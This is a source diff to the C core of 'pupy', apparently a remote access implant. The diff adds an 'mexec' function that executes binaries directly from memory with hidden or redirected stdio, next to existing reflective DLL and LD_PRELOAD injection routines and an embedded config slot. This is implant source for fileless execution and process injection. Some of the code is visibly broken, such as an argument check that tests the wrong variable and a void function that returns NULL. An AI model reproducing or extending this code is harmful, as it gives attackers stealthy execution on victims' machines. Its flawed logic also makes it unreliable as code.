@@ -23,6 +23,8 @@ static const char module_doc[] = "Builtins utilities for pupy";
 
 static const char pupy_config[8192]="####---PUPY_CONFIG_COMES_HERE---####\n";
 
+static PyObject *ExecError;
+
 #include "lzmaunpack.c"
 
 static PyObject *Py_get_modules(PyObject *self, PyObject *args)
@@ -128,7 +130,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
 		close(fd);
 	}
 
-	prctl(4, 0, 0, 0, 0);
+	prctl(3, 0, 0, 0, 0);
 
 	if (pid == -1) {
 		dprint("Couldn\'t daemonize: %m\n");
@@ -192,7 +194,7 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 		waitpid(injpid, &status, 0);
 	}
 
-	prctl(4, 0, 0, 0, 0);
+	prctl(3, 0, 0, 0, 0);
 
 	dprint("Injection code: %d\n", status);
 
@@ -224,12 +226,72 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 	return PyBool_FromLong(0);
 }
 
+static PyObject *Py_mexec(PyObject *self, PyObject *args)
+{
+	const char *buffer = NULL;
+	size_t buffer_size = 0;
+	PyObject *argv_obj = NULL;
+	PyObject *redirected_obj = NULL;
+	PyObject *detach_obj = NULL;
+
+	if (!PyArg_ParseTuple(args, "s#OOO", &buffer, &buffer_size, &argv_obj, &redirected_obj, &detach_obj))
+		return NULL;
+
+	Py_ssize_t argc = PySequence_Length(argv_obj);
+	if (args < 1) {
+		PyErr_SetString(ExecError, "Args not passed");
+        return NULL;
+	}
+
+	bool redirected = PyObject_IsTrue(redirected_obj);
+	bool detach =  PyObject_IsTrue(detach_obj);
+	char **argv = (char **) malloc(sizeof(char*) * (argc + 1));
+	if (!argv) {
+		PyErr_SetString(ExecError, "Too many args");
+        return NULL;
+	}
+
+	int i;
+	for (i=0; i<argc; i++) {
+		PyObject *arg = NULL;
+		arg = PySequence_GetItem(argv_obj, i);
+		if (arg)
+			argv[i] = PyString_AsString(arg);
+	}
+	argv[argc] = NULL;
+
+	int stdior[3] = { -1, -1, -1 };
+	pid_t pid = memexec(buffer, buffer_size, argv, stdior, redirected, detach);
+
+	if (pid < 0) {
+		PyErr_SetString(ExecError, "Can't execute");
+		return NULL;
+	}
+
+	PyObject * p_stdin = Py_None;
+	PyObject * p_stdout = Py_None;
+	PyObject * p_stderr = Py_None;
+
+	if (redirected) {
+		p_stdin = PyFile_FromFile(fdopen(stdior[0], "w"), "mexec:stdin", "a", fclose);
+		p_stdout = PyFile_FromFile(fdopen(stdior[1], "r"), "mexec:stdout", "r", fclose);
+		p_stderr = PyFile_FromFile(fdopen(stdior[2], "r"), "mexec:stderr", "r", fclose);
+
+		PyFile_SetBufSize(p_stdin, 0);
+		PyFile_SetBufSize(p_stdout, 0);
+		PyFile_SetBufSize(p_stderr, 0);
+	}
+
+	return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
+}
+
 static PyMethodDef methods[] = {
 	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
 	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
 	{ "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
 	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure" },
 	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
+	{ "mexec", Py_mexec, METH_VARARGS, "mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))" },
 	{ "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
 	{ NULL, NULL },		/* Sentinel */
 };
@@ -237,5 +299,12 @@ static PyMethodDef methods[] = {
 DL_EXPORT(void)
 initpupy(void)
 {
-	Py_InitModule3("pupy", methods, module_doc);
+	PyObject *pupy = Py_InitModule3("pupy", methods, module_doc);
+	if (!pupy) {
+		return NULL;
+	}
+
+	ExecError = PyErr_NewException("pupy.error", NULL, NULL);
+    Py_INCREF(ExecError);
+    PyModule_AddObject(pupy, "error", ExecError);
 }
